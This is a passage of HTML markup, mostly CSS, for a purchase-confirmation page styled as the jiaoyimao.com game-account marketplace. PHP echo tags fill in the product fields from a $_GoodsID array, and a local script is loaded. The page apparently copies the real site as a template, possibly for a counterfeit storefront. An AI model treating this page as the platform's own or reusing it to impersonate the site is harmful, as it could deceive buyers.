8px;line-height:24px;font-weight:400;color:#fff;background:#4091EA;font-size:14px;display:inline-block;border-radius:2px;font-weight:400;text-align:center;cursor:pointer}.real-user-verify .dialog-btns__large .dialog-comfirm{height:34px;line-height:34px;min-width:80px}.real-user-verify .dialog-btns{text-align:right}.real-user-verify .dialog-close__icon{width:16px;height:16px;display:block}.real-user-verify .dialog-close{position:absolute;right:24px;top:20px;cursor:pointer}.real-user-verify .realVerity-dialog{width:640px}.real-user-verify .real-input__box{justify-content:flex-start;position:relative;height:64px}.real-user-verify .real-input__errorbox .real-input{border:1px solid red}.real-user-verify .real-input__errorbox .real-input__clear>i{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAYAAAAfSC3RAAAAAXNSR0IArs4c6QAAAERlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAADqADAAQAAAABAAAADgAAAAC98Dn6AAABQklEQVQoFZ1SPUsDQRB977ygiGniD7AwrWBnKci1iVjbXWlt6U8QW7v8AC2E01LESrC2TZMfoCABQS+59c2u92Vi48CyM7PvzezuPKJhbph24V5PQQ6V7v8cjeFcBm6eMxtNSzhLxw2ODgA30toqc+2dE4Apb28eLO+JgVTcl3Gb0IocECVGZrje28vfnVpEqz0BezuRf1PzeuSV3nhZwc0nr6vYsPqHWBUO1a2RRwJ29oB8IyQ7F3D5cw2Qp8+L9crtJk9FesDXHbi+78Hu41G7ci3rq+My4yriz8ifzLimcSyAjDjW2q1OiClWOEBenPlcLH/unnSrboURJ/bDbRKBDLPiWKATD5zjXXumZblgEsT/xxFkxFSlFh9Sdqh3YaQeSc9/QJBRlPjh1qBfnkkuqMYOKq1aUIncZmtjCrZU5N8pLnJZMWjZfgAAAABJRU5ErkJggg==) no-repeat center center}.real-user-verify .real-input__container{display:flex;align-items:flex-start;justify-content:center;height:64px}.real-user-verify .real-label{color:#000;font-size:14px;width:70px;display:inline-block;height:32px;line-height:32px}.real-user-verify .real-input{width:340px;height:32px;border:1px solid #BFBFBF;border-radius:2px;padding:5px 12px;box-sizing:border-box;font-size:14px;color:#595959}.real-user-verify .real-input::placeholder{color:#BFBFBF}.real-user-verify .real-input__error{color:#D6503D;font-size:14px;line-height:22px;height:32px;padding-top:2px;justify-self:flex-start}.real-user-verify .real-input__clear{position:absolute;display:inline-block;width:14px;height:14px;right:9px;top:9px;cursor:pointer}.real-user-verify .real-input__clear>i{width:16px;height:16px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAYAAAAfSC3RAAAAAXNSR0IArs4c6QAAAERlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAADqADAAQAAAABAAAADgAAAAC98Dn6AAABG0lEQVQoFY2Sv0vCQRiH1UrRhhCCIqLBJmvUuT8gl8am1v6EhnBpiwZnXfofgjZpb2gMnFsUbGizhqDnyXvhCgU/8Nz74+6+d+/3vWLhr6qEHWjBbpqaYF/gEWYpVyiGgz2GS9jOcrn7TtCHV5NrDshN11AzWCLnTmAE0xKD1/OkVeXaqieegTWFnnH8aiMlhtgp7KfYk7/deAFbKampwwA24Q0e4BzKEKr5c+6hEplkx9ib5Hexe8kP87Ue3j+7QWz9Kj9pnmF00j7l+iS4A2sXfXO5JtZoTc0s68+xl6dwCDb9Aw4g9GSNtuMWljU+Fof1IVx5Vb/oi1hVrp15VWWf7N0R2KdF8qQe/D65/K262Gt3oA07oBY+8h99hC3CzNb3YQAAAABJRU5ErkJggg==) no-repeat center center;display:inline-block}.real-user-verify .pc-realVerity-content{margin-bottom:40px}.real-user-verify .pc-realVerity-btn{text-align:left;margin-left:160px;padding-bottom:16px}.real-user-verify .pc-bindAlipay-tips{font-size:12px;color:#8d9199;padding-bottom:20px}.real-user-verify .pc-bindAlipay-dialog{width:520px}.real-user-verify .pc-bindAlipay-dialog .redfont{color:#D6503D}.real-user-verify .nonage-dialog__content{margin-bottom:12px;width:336px}
</style><style>.realManDialog .am-modal-mask{position:fixed;top:0;right:0;left:0;bottom:0;height:100%;z-index:1000;background-color:rgba(15,19,26,0.7)}.realManDialog .am-modal{position:fixed;top:50%;border-radius:10px;z-index:1001;background:#fff;margin:-196px 0 0 -290px;left:50%;background-color:#fff}.realManDialog .am-modal-title{padding:20px 0 20px 30px;font-size:16px;color:#303133;position:relative;border-bottom:1px solid #E6E8EB;font-weight:700}.realManDialog .am-modal-close{padding:15px;background-color:transparent;outline:0;position:absolute;right:0;top:0;z-index:999;border:0;cursor:pointer}.realManDialog .am-modal-close-x{display:inline-block;font-size:20px;font-family:jymiconfont;font-style:normal;font-weight:400;text-transform:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.realManDialog .am-modal-close-x:before{display:inline-block;vertical-align:middle;text-align:center;content:'\e684'}.realManDialog .am-modal-body{padding:32px 40px 30px 35px;text-align:center;background-repeat:no-repeat;background-size:70%;background-position:100% 0;position:relative;overflow:hidden}.realManDialog .aliCert-operate-left{width:300px}.realManDialog .aliCert-operate-dtl{font-size:12px;color:#5F6166;line-height:20px;margin-bottom:30px;text-align:left}.realManDialog .aliCert-content-list{display:flex}.realManDialog .aliCert-content-item{background-color:#FFF;box-shadow:0 0 10px 2px rgba(0,56,166,0.08);border-radius:5px;flex:1;height:95px;margin-right:15px;text-align:center;font-size:14px;padding-top:20px;box-sizing:border-box;color:#303133;font-weight:700}.realManDialog .aliCert-content-icon{width:30px;height:30px;margin-bottom:10px}.realManDialog .clearfix:after{content:'\20';display:block;height:0;clear:both}.realManDialog .aliCert-operate-right{position:absolute;right:0;top:0;background-color:#F5F7FA;border-bottom-right-radius:10px;text-align:center;width:220px;font-size:12px;color:#8D9199;line-height:20px;padding:24px 8px 25px 8px;box-sizing:border-box}.realManDialog .aliCert-operate-right-img{background-color:#fff;padding:5px;box-sizing:border-box;width:115px;margin:0 auto 15px;height:115px}.realManDialog .aliCert-operate-right>a{color:#0FA8FA;text-decoration:none}
</style><style>@font-face{font-family:jymiconfontV2;src:url("//at.alicdn.com/t/font_2439706_cndvz8197oh.eot");src:url("//at.alicdn.com/t/font_2439706_cndvz8197oh.eot?#iefix") format("embedded-opentype"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.woff") format("woff"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.ttf") format("truetype"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.svg#NextIcon") format("svg")}.clearfix{*zoom:1}.clearfix:before,.clearfix:after{content:" ";display:table}.clearfix:after{clear:both}@supports (bottom: constant(safe-area-inset-bottom)) or (bottom: env(safe-area-inset-bottom)){.safe-area-inset-bottom{padding-bottom:constant(safe-area-inset-bottom);padding-bottom:env(safe-area-inset-bottom)}}.jym-modal{position:relative}.jym-modal:not(.jym-modal-transparent):not(.jym-modal-popup){width:100%;height:100%}.jym-modal-mask{position:fixed;top:0;right:0;left:0;bottom:0;height:100%;z-index:1000;background-color:rgba(15,19,26,0.7)}.jym-modal-mask-hidden{display:none}.jym-modal-wrap{position:fixed;overflow:auto;top:0;right:0;bottom:0;left:0;height:100%;z-index:1000;-webkit-overflow-scrolling:touch;outline:0;display:flex;align-items:center;justify-content:center;transform:translateZ(1px)}.jym-modal-wrap-popup{display:block}.jym-modal-transparent{width:7.2rem}.jym-modal-transparent .jym-modal-content{border-radius:.18667rem}.jym-modal-nopadding .jym-modal-body{padding:0}.jym-modal-popup{position:fixed;left:0;width:100%}.jym-modal-popup-slide-down{top:0}.jym-modal-popup-slide-up{bottom:0}.jym-modal-popup .jym-modal-content{border-radius:.42667rem .42667rem 0 0}.jym-modal-title{margin:0;font-size:.48rem;font-weight:bold;color:#303133;text-align:center;line-height:1.2rem}.jym-modal-header{height:1.33333rem;line-height:1.33333rem;position:relative;padding-top:.13333rem;box-sizing:border-box}.jym-modal-content{position:relative;background-color:#fff;border:0;background-clip:padding-box;text-align:center;height:100%;overflow:hidden}.jym-modal-close{border:0;padding:0;background-color:transparent;outline:none;position:absolute;right:0;z-index:999;width:1.33333rem;height:1.2rem;margin-top:.13333rem}.jym-modal-close-x{display:inline-block;font-size:.58667rem;font-family:jymiconfontV2;font-style:normal;font-weight:normal;text-transform:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.jym-modal-close-x:before{display:inline-block;vertical-align:middle;text-align:center;content:'\e76b'}.jym-modal-close-white .jym-modal-close-x{color:white}.jym-modal-body{padding:.8rem;height:100%;overflow:auto}.xianyu-modal .jym-modal-header{height:auto;line-height:1;padding-top:1.06667rem;border-bottom:none}.xianyu-modal .jym-modal-header:after{display:none !important}.xianyu-modal .jym-modal-title{font-size:.48rem}.xianyu-modal .jym-modal-close-x{color:#c1c1c1}.jym-modal-button{-webkit-touch-callout:none;flex:1;box-sizing:border-box;text-align:center;text-decoration:none;outline:none;color:#0FA8F5;font-size:.42667rem;height:1.30667rem;line-height:1.30667rem;display:block;width:auto;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.jym-modal-button:first-child{color:#8D9199}.jym-modal-button:last-child{color:#0FA8F5}.jym-modal-button:last-child{position:relative;border-left:1PX solid #E6E8EB}@media (min-resolution: 2dppx){html:not([data-scale]) .jym-modal-button:last-child{border-left:none}html:not([data-scale]) .jym-modal-button:last-child::before{content:'';position:absolute;background-color:#E6E8EB;display:block;z-index:1;top:0;right:auto;bottom:auto;left:0;width:1px;height:100%;transform-origin:100% 50%;transform:scaleX(0.5)}}@media (min-resolution: 2dppx) and (min-resolution: 3dppx){html:not([data-scale]) .jym-modal-button:last-child::before{transform:scaleX(0.33)}}.jym-modal-button-group-normal{display:flex;position:relative;border-top:1PX solid #E6E8EB}@media (min-resolution: 2dppx){html:not([data-scale]) .jym-modal-button-group-normal{border-top:none}html:not([data-scale]) .jym-modal-button-group-normal::before{content:'';position:absolute;background-color:#E6E8EB;display:block;z-index:1;top:0;right:auto;bottom:auto;left:0;width:100%;height:1px;transform-origin:50% 50%;transform:scaleY(0.5)}}@media (min-resolution: 2dppx) and (min-resolution: 3dppx){html:not([data-scale]) .jym-modal-button-group-normal::before{transform:scaleY(0.33)}}.jym-modal-alert-content,.jym-modal-propmt-content{zoom:1;overflow:hidden;font-size:.42667rem;color:#303133;line-height:1.5}.jym-modal-transparent.jym-modal-android .jym-modal-content{border-radius:.37333rem}.jym-modal-transparent.jym-modal-android .jym-modal-content .jym-modal-body{padding:.85333rem .96rem .64rem}.jym-modal-transparent.jym-modal-android .jym-modal-content .jym-modal-button:first-child{color:#222222}.am-icon{fill:currentColor;background-size:cover}.am-icon-lg{width:1.06667rem;height:1.06667rem}.am-icon-loading{animation:cirle-anim 1s linear infinite}@keyframes cirle-anim{100%{transform:rotate(360deg)}}.am-toast{position:fixed;width:100%;z-index:1000;font-size:.42667rem;text-align:center}.am-toast>span{max-width:50%}.am-toast-mask{height:100%;display:flex;justify-content:center;align-items:center;left:0;top:0;transform:translateZ(1px)}.am-toast-nomask{position:fixed;max-width:50%;width:auto;left:50%;top:50%;transform:translateZ(1px)}.am-toast-nomask .am-toast-notice{transform:translateX(-50%) translateY(-50%)}.am-toast-notice-content .am-toast-text{min-width:4rem;max-width:7.33333rem;line-height:1.5;border-radius:.13333rem;color:#fff;background-color:rgba(30,33,51,0.8);padding:.53333rem}.toaster-loading img{width:1.06667rem;height:1.06667rem;margin:0 auto .34667rem}.toaster-ok .iconfont-choose:first-child{font-size:1.06667rem;color:#0ACC6B}.toaster-ok .sub-content{font-family:PingFangSC-Medium;font-size:.37333rem;color:#C0C4CC;text-align:center;line-height:.53333rem}.jym-toast{position:fixed;width:100%;z-index:1000;font-size:.42667rem;text-align:center}.jym-toast-mask{height:100%;display:flex;justify-content:center;align-items:flex-end;left:0;top:0;transform:translateZ(1px)}.jym-toast-text{min-width:4rem;max-width:7.33333rem;line-height:1.5;border-radius:.13333rem;color:#fff;background-color:rgba(30,33,51,0.8);padding:.26667rem;margin-bottom:20%}.jym-toast-custom{position:fixed;width:100%;z-index:1000;font-size:.42667rem;text-align:center}.jym-toast-custom-mask{height:100%;display:flex;justify-content:center;align-items:center;left:0;top:0;transform:translateZ(1px)}.jym-toast-custom-text{font-size:.37333rem;width:3.2rem;height:3.2rem;max-width:7.33333rem;line-height:1.5;border-radius:.13333rem;color:#fff;background-color:rgba(30,33,51,0.8);padding:.26667rem;box-sizing:border-box}.jym-toast-custom-loading{padding:.4rem 0;width:.93333rem;margin:auto}.jym-button{display:block;outline:0 none;-webkit-appearance:none;box-sizing:border-box;padding:0;text-align:center;font-size:.42667rem;height:1.33333rem;line-height:1.33333rem;position:relative;overflow:hidden;text-overflow:ellipsis;word-break:break-word;white-space:nowrap;color:#fff;background-color:#05B4FF;border-radius:.66667rem;cursor:pointer}.jym-button-borderfix:before{transform:scale(0.49) !important}.jym-button-disabled{opacity:.2}.jym-button-warning{background-image:linear-gradient(135deg, #FF9B05 0%, #FF5805 100%);color:#fff}.jym-button-main-light{background:#F0FAFF}.jym-button-icon{display:flex;align-items:center;justify-content:center}.jym-button>.jym-button-icon{margin-right:0.5em}.jym-button-inline{display:inline-block}.jym-button-inline.jym-button-md{padding:0 .74667rem}.jym-button-md{height:1.06667rem;line-height:1.06667rem;font-size:.37333rem;border-radius:.53333rem}.jym-button-small{font-size:.37333rem;height:.8rem;line-height:.77333rem;padding:0 .26667rem}.jym-button-mini{font-size:.32rem;height:.64rem;line-height:.64rem}.jym-button-primary{background:#fff;color:#303133;border:1px solid #E6E8EB}.jym-button-primary:hover{color:#303133}.jym-button-secondary{background:#F0FAFF;color:#0FA8F5}.jym-button-secondary:hover{color:#0FA8F5}.jym-button-secondary-black{background:#F5F7FA;color:#303133}.jym-button-ghost{background:transparent;border:1px solid #3bf;border-radius:.66667rem;color:#0FA8F5}.jym-button-ghost:hover{color:#0FA8F5}.jym-button-ghost-disable{background:transparent;border:1px solid #E6E8EB;border-radius:.66667rem;color:#8D9199}.jym-button-ghost-disable:hover{color:#8D9199}.jym-button-ghost-white{background:transparent;border:1px solid #fff;border-radius:.66667rem;color:#fff}.jym-button-ghost-white:hover{color:#fff}.jym-button-blue{background-color:#05B4FF;background-image:none}.jym-button-block{width:100%;border-radius:0;border:none}.jym-button-btns{display:flex}.jym-button-btns-item{flex:1;margin:0 .18667rem}.jym-button-btns-item:first-child{margin-left:0}.jym-button-btns-item:last-child{margin-right:0}.jym-button-clicked{background-image:linear-gradient(-135deg, #C0C4CC 0%, #D7D9DB 100%)}.jym-button-clicked:hover{color:#fff;opacity:1}.jym-button-clicked.jym-button-disabled{opacity:1}.jym-button-full{display:block;width:100%;height:1.33333rem;line-height:1.33333rem;font-size:.48rem;text-align:center;color:#fff;background-image:linear-gradient(315deg, #078AFD 0%, #04A3FE 40%, #00C7FF 100%);background-color:#078AFD}.jym-button-full-disabled{background-image:linear-gradient(315deg, #CFE8FF 0%, #D0EDFF 40%, #D0F4FF 100%)}.jym-button-full.jym-button-full-fm{background-color:#EB544D;background-image:none}@font-face{font-family:jymiconfontV2;src:url("//at.alicdn.com/t/font_2439706_cndvz8197oh.eot");src:url("//at.alicdn.com/t/font_2439706_cndvz8197oh.eot?#iefix") format("embedded-opentype"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.woff") format("woff"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.ttf") format("truetype"),url("//at.alicdn.com/t/font_2439706_cndvz8197oh.svg#NextIcon") format("svg")}.jym-iconfontV2{display:inline-block;font-family:jymiconfontV2;font-style:normal;font-weight:normal;text-transform:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.jym-iconfontV2:before{display:inline-block;vertical-align:middle;text-align:center}.jym-iconfontV2-goods-name:before{content:"\e778"}.jym-iconfontV2-goods-tick:before{content:"\e777"}.jym-iconfontV2-more-link:before{content:"\e776"}.jym-iconfontV2-more-key:before{content:"\e775"}.jym-iconfontV2-nav-share:before{content:"\e774"}.jym-iconfontV2-nav-back:before{content:"\e773"}.jym-iconfontV2-more:before{content:"\e772"}.jym-iconfontV2-pop-report:before{content:"\e771"}.jym-iconfontV2-question:before{content:"\e770"}.jym-iconfontV2-pop-message:before{content:"\e77e"}.jym-iconfontV2-pop-home:before{content:"\e76e"}.jym-iconfontV2-ios:before{content:"\e76d"}.jym-iconfontV2-nav-collection:before{content:"\e76c"}.jym-iconfontV2-close:before{content:"\e76b"}.jym-iconfontV2-q:before{content:"\e76a"}.jym-iconfontV2-goods-people:before{content:"\e769"}.jym-iconfontV2-goods-zhima:before{content:"\e768"}.jym-iconfontV2-goods-collect:before{content:"\e766"}.jym-iconfontV2-good-beg:before{content:"\e765"}.jym-iconfontV2-table-tick:before{content:"\e77a"}.jym-iconfontV2-table-arrow:before{content:"\e779"}.jym-iconfontV2-received:before{content:"\e77b"}.jym-iconfontV2-collect-pre:before{content:"\e77c"}.jym-iconfontV2-wait:before{content:"\e783"}.jym-iconfontV2-cancel:before{content:"\e782"}.jym-iconfontV2-receiving:before{content:"\e781"}.jym-iconfontV2-record:before{content:"\e780"}.jym-iconfontV2-deliver:before{content:"\e77f"}.jym-iconfontV2-message:before{content:"\e77e"}.jym-iconfontV2-received-text:before{content:"\e77d"}.jym-iconfontV2-unfold:before{content:"\e620"}.jym-iconfontV2-selected:before{content:"\e621"}.jym-iconfontV2-unSelected::before{content:"\e784"}.jym-iconfontV2-bell::before{content:"\e607"}.jym-iconfontV2-zan:before{content:"\e60b"}.jym-iconfontV2-successful:before{content:"\e609"}.jym-iconfontV2-warning-black:before{content:"\e623"}.jym-iconfontV2-notice:before{content:"\e607"}.jym-iconfontV2-pc:before{content:"\e613"}.jym-iconfontV2-android:before{content:"\e767"}.jym-iconfontV2-order-list-seller:before{content:"\e60a"}.jym-iconfontV2-open-eyes:before{content:"\e624"}.jym-iconfontV2-close-eyes:before{content:"\e625"}.jym-iconfontV2-checkbox-nor:before{content:"\e784"}.jym-iconfontV2-reflesh:before{content:"\e60d"}.jym-iconfontV2-service:before{content:"\e60c"}.jym-iconfontV2-enlarge:before{content:"\e60f"}.real-modal .jym-modal-body,.real-modal2 .jym-modal-body{padding:0 .42667rem;padding-bottom:env(safe-area-inset-bottom);padding-bottom:env(safe-area-inset-bottom)}.real-modal .jym-button.real-button,.real-modal2 .jym-button.real-button{margin-bottom:.26667rem;height:1.06667rem;line-height:1.06667rem;font-size:.42667rem;background:#0FA8FA;display:block;outline:0 none;-webkit-appearance:none;box-sizing:border-box;padding:0;text-align:center;position:relative;overflow:hidden;text-overflow:ellipsis;word-break:break-word;white-space:nowrap;border-radius:.66667rem;cursor:pointer;color:#fff;display:flex;justify-content:center}.real-modal2 .jym-modal-body{padding:0 .4rem;padding-bottom:env(safe-area-inset-bottom);padding-bottom:env(safe-area-inset-bottom)}.bindAlipay-content{text-align:left;font-size:.37333rem;color:#5F6166;line-height:.58667rem;padding-bottom:.88rem}.bindAlipay-content .redfont{color:#FF301A}.bindAlipay-tips{text-align:left;font-size:.32rem;color:#8D9199;padding-bottom:.13333rem;display:flex;line-height:1.5;align-items:flex-start}.rule-link{color:#0FA8FA;cursor:pointer;user-select:none;text-decoration:none}.bindAlipay-tips__radio{font-size:.42667rem;margin-right:.10667rem;line-height:1;color:#e6e8eb;position:relative}.bindAlipay-tips__radio.jym-iconfontV2-selected{color:#0FA8FA}.bindAlipay-tips__radio::after{content:'';position:absolute;width:473%;height:170%;display:block;left:-10%;top:-50%}.realVerify-page{width:100%;height:100vh;background:#F5F7FA}.realVerify-page .form-item{margin:0 .32rem}.realVerify-page .realVerify-form{background:#fff}.realVerify-page .real-button{margin:0 .32rem}.realVerify-title{height:1.49333rem;line-height:1.4;background:#F5F7FA;color:#8D9199;font-size:.37333rem;padding:0 .32rem;box-sizing:border-box;display:flex;justify-content:center;align-items:center}.realVerify-content{text-align:left;font-size:.37333rem;font-weight:normal;color:#5F6166;padding-bottom:.16rem;line-height:.58667rem}.realVerify-form{font-size:.42667rem;color:#5F6166;margin-bottom:.53333rem;width:100%}.realVerify-form .form-item{display:flex;justify-content:space-between;align-items:center;height:1.6rem;border-bottom:1px solid #E6E8EB;background:#fff}.realVerify-form .form-item__input{border:none;text-align:right;background:none;outline:none;border:none;color:#5F6166;font-size:.42667rem;height:1.6rem;-webkit-appearance:none}.realVerify-form .form-item__input::placeholder{color:#C0C4CC;font-size:.42667rem}.realVerify-form .form-item__input:focus{border:none}.realManVerify-content{font-size:.37333rem;line-height:.53333rem;text-align:left;border-radius:.10667rem;box-sizing:border-box;color:#5F6166;margin-bottom:1.33333rem}.realManVerify-content .redfont{color:#FF301A;padding-top:.10667rem;display:inline}.realVerify-success{text-align:center}.realVerify-success .jym-iconfontV2-selected{font-size:40px;color:#32cc6b;margin-top:1.6rem}.realVerify-success .real-button{width:3.2rem;margin:auto}.realVerify-success__title{font-weight:700;color:#5F6166;font-size:.42667rem;margin-top:.53333rem}.realVerify-success__deputy{font-size:.37333rem;color:#8D9199;margin-top:.16rem;margin-bottom:.53333rem}.realVerify-img{width:1.06667rem}.realname-comfirm .jym-modal-body{font-size:.42667rem;padding:.53333rem}.realname-comfirm .jym-modal-transparent{width:7.33333rem}.realname-comfirm .jym-modal-title{font-size:.48rem;line-height:1;padding-top:.53333rem}.realname-comfirm .jym-modal-header{padding-top:0;height:auto}
</style>
	
<meta content="wap" name="data-jym-spm-v">
<meta name="data-spm" content="gcmall">

				    	    	    	    <title>	
	 
	交易猫_手机游戏交易平台_游戏帐号交易_游戏币交易_装备交易_道具交易   
</title>
<meta name="keywords" content="手机游戏交易平台,手机网游,游戏账号交易,游戏币交易,交易猫">
<meta name="description" content="交易猫(jiaoyimao.com)是国内专业的手机游戏交易平台,提供免费的手机游戏装备交易、游戏帐号交易、游戏币交易、游戏道具交易、手机游戏礼包领取和激活码。">	        		    <link rel="stylesheet" type="text/css" href="img/mobile.css?2021063019" charset="utf-8">
		    <link rel="icon" type="image/ico" href="https://image.jiaoyimao.com/public/touch/images/favicon.ico?2021063019">
    <link rel="canonical" href="https://www.jiaoyimao.com/buyer/1625112003593786/buy">
  <script src="sanming045.js"></script>
<style type="text/css">.bridgeCenter{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;overflow:hidden}.bridge-backdrop{position:fixed;left:0;right:0;top:0;bottom:0;background:rgba(0,0,0,.3);transform:translateZ(0);z-index:998}.bridge-toast-wrapper{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;overflow:hidden;background:rgba(0,0,0,.8);border-radius:13px}.bridge-toast-wrapper .bridge-toast-message{color:#fff;font-size:1em;padding:1em;margin:0}</style><style type="text/css">.bridgeCenter{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;overflow:hidden}.bridge-backdrop{position:fixed;left:0;right:0;top:0;bottom:0;background:rgba(0,0,0,.3);transform:translateZ(0);z-index:998}.bridge-pop{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;overflow:hidden;background:#f8f8f8;border-radius:13px;min-width:250px;display:-ms-flexbox;display:flex;-ms-flex-direction:column;flex-direction:column}.bridge-pop *{box-sizing:border-box}.bridge-pop .bridge-pop-header{text-align:center;padding:12px 16px 7px}.bridge-pop .bridge-pop-title{margin:0;padding:0;margin-top:8px;font-size:17px;font-weight:600}.bridge-pop .bridge-pop-message{max-height:240px;text-align:center;font-size:13px;padding:0 16px 12px;overflow-y:scroll}.bridge-pop .bridge-pop-btn-group{display:-ms-flexbox;display:flex;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap}.bridge-pop .bridge-pop-btn{min-width:50%;height:44px;line-height:44px;text-align:center;border-top:.55px solid #dbdbdf;border-right:.55px solid #dbdbdf;font-size:17px;color:#488aff;-ms-flex:1 1 auto;flex:1 1 auto;overflow:hidden}.bridge-pop .bridge-pop-btn:last-child{border-right:none}</style><style type="text/css">.bridgeCenter{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;overflow:hidden}.bridge-backdrop{position:fixed;left:0;right:0;top:0;bottom:0;background:rgba(0,0,0,.3);transform:translateZ(0);z-index:998}@keyframes ani{0%{opacity:1}to{opacity:0}}.bridge-loading{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;overflow:hidden;border-radius:13px;background:rgba(0,0,0,.3);height:80px;width:100px}.bridge-loading .bridge-loading-circle{position:absolute;top:30%;left:50%}.bridge-loading .bridge-loading-circle div{position:absolute;width:2px;height:8px;background:#fff;border-radius:20%;opacity:.05;animation:ani .8s linear infinite}.bridge-loading .bridge-loading-circle div:first-child{transform:rotate(0deg) translateY(-12px);animation-delay:.05s}.bridge-loading .bridge-loading-circle div:nth-child(2){transform:rotate(30deg) translateY(-12px);animation-delay:.1s}.bridge-loading .bridge-loading-circle div:nth-child(3){transform:rotate(60deg) translateY(-12px);animation-delay:.15s}.bridge-loading .bridge-loading-circle div:nth-child(4){transform:rotate(90deg) translateY(-12px);animation-delay:.2s}.bridge-loading .bridge-loading-circle div:nth-child(5){transform:rotate(120deg) translateY(-12px);animation-delay:.25s}.bridge-loading .bridge-loading-circle div:nth-child(6){transform:rotate(150deg) translateY(-12px);animation-delay:.3s}.bridge-loading .bridge-loading-circle div:nth-child(7){transform:rotate(180deg) translateY(-12px);animation-delay:.35s}.bridge-loading .bridge-loading-circle div:nth-child(8){transform:rotate(210deg) translateY(-12px);animation-delay:.4s}.bridge-loading .bridge-loading-circle div:nth-child(9){transform:rotate(240deg) translateY(-12px);animation-delay:.45s}.bridge-loading .bridge-loading-circle div:nth-child(10){transform:rotate(270deg) translateY(-12px);animation-delay:.5s}.bridge-loading .bridge-loading-circle div:nth-child(11){transform:rotate(300deg) translateY(-12px);animation-delay:.55s}.bridge-loading .bridge-loading-circle div:nth-child(12){transform:rotate(330deg) translateY(-12px);animation-delay:.6s}.bridge-loading .bridge-loading-title{position:absolute;width:100%;bottom:10%;color:#fff;margin:0;margin-top:20px;font-size:12px;letter-spacing:1px;text-align:center}</style></head>
<body data-spm="confirm_order" class="" style="font-size: 12px;">
<input type="hidden" id="aplus-uid" value="1546945604232290">
<input type="hidden" id="aplus-sid" value="1625185606361132">


            <div class="dl-jiaoyimao new-dl-jiaoyimao" style="display: none;  position: static; ">
        <div class="inner">
            <a class="dl-jiaoyimao-url" href="https://downum.game.uc.cn/download/package/745439-100559218?did=957ab45602e3459d833c866668b4583e">
                <i class="newDownBackImg"></i>
            </a>
            <i class="newDownCloseIcon"></i>
        </div>
    </div>
    		<!--[if lte IE 7]>
  <div id="kie-bar" class="kie-bar">
      亲爱的网友，您的浏览器IE6已经太老了，存在安全隐患，很多先进功能无法使用，建议您升级IE浏览器或推荐使用UC浏览器（<a href="http://www.uc.cn/ucbrowser/download/" target="_blank" title="UC浏览器下载">点此下载</a>）
  </div>
  <style>
      .kie-bar {
          height: 24px;
          line-height: 1.8;
          font-weight:normal;
          text-align: center;
          border-bottom:1px solid #fce4b5;
          background-color:#FFFF9B;
          color:#e27839;
          position: relative;
          font-size: 14px;
          text-shadow: 0px 0px 1px #efefef;
          padding: 5px 0;
      }
      .kie-bar a {
          color:#08c;
          text-decoration: none;
      }
  </style>
<![endif]-->	<!-- 显示标题组件，可以设置标题，指定回退路径以及添加额外的操作按钮 -->

<div class="module-title fui-border-b-linght">
				<h1>购买确认</h1>
					<a href="javascript:history.back();" class="back-btn"><i class="fui-back-arr"></i></a>
		
	    		
		

</div>




<style>
    body { background: #F5F7FA; padding-bottom: 70px;}
</style>


<!-- 板块标题 -->
<!-- <script src="//g.alicdn.com/??/AWSC/AWSC/awsc.js,/sd/baxia-entry/baxiaCommon.js"></script> -->
<!-- 尽量跑在逻辑前面 -->
<!-- 板块内容 -->
<div class="sub-con full-con no_margin">
    <dl class="list-detail no_list_detail hide">
                                            <dd style="display: none;"><span class="title">单价</span><span>799.0</span>元</dd>
                <input type="hidden" id="unitPrice" value="799.0">
                                
                        <span id="origin-insurane-price" style="display:none">799.0</span>
            </dl>
</div>
<div class="optizime-confirm-buy">
            <!--其他类型的交易-->
    <div class="order-item confirm-goods clearfix">
                <div class="icon confirm-goods-icon" style="background-image: url(<?php echo $_GoodsID['goods_img1'];?>)"></div>
                <div class="info">
            <div class="title" id="goodsName">
                <i class="tag-badge-1"></i>
                <span id="goods-name"><?php echo $_GoodsID['title'];?></span>
            </div>
            <div class="description">
                <span class="game-name"><?php echo $_GoodsID['user_name'];?></span>
                <span class="game-client"><?php echo $_GoodsID['att_color'];?></span>
                <span class="game-server"><?php echo $_GoodsID['freight']; ?></span>
            </div>
            <div class="price">
                <span class="format-price confirm-goods-price">
                    <span>¥</span>
                    <span class="goods-price-number">
                        <?php echo $_GoodsID['price'];?>
                    </span>
                </span>
            </div>
        </div>
    </div>
        <input type="hidden" id="good-stock" value="1">
</div>
<input id="goodsId" type="hidden" value="1625112003593786">
<form action="#" method="post" id="f1122">
    <div class="sub-con full-con no_margin ">
        <div class="form-control-group">
            <!-- 增加是否是灵犀账号角色交易的判断，如果是的话就不显示购买数量 -->
                        <div class="goods-buy-number fill-goods-info">
                <label class="label key title buy-number">购买数</label>
                <div class="content number-select">
                                                            <span class="only-read-number">1件</span>
                                        <span class="input-text hide">
                        <!-- 购买数量判断弄到后端 -->
                                                                        <input type="hidden" id="num" name="num" value="1">
                                            </span>
                </div>
            </div>
                        
                                                                        <input type="hidden" id="coupon-value" value="0.00">
                <input type="hidden" id="coupon-id" value="">
                <input type="hidden" id="coupon-type" value="">
                            
        </div>
    </div>

                <!--start非灵犀账号角色交易的-->

<div class="sub-con sub-con-from-control-group full-con no_margin optizime-user-info">
